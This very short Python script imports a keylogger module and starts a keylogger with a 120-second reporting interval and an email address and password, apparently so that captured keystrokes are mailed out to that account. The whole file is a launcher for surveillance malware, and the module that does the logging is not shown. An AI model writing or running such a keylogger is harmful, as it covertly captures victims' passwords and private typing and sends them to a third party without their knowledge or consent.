#!/usr/bin/env python

import keylogger

my_keylogger = keylogger.Keylogger(120, "user@mail.com", "password")
my_keylogger.start()
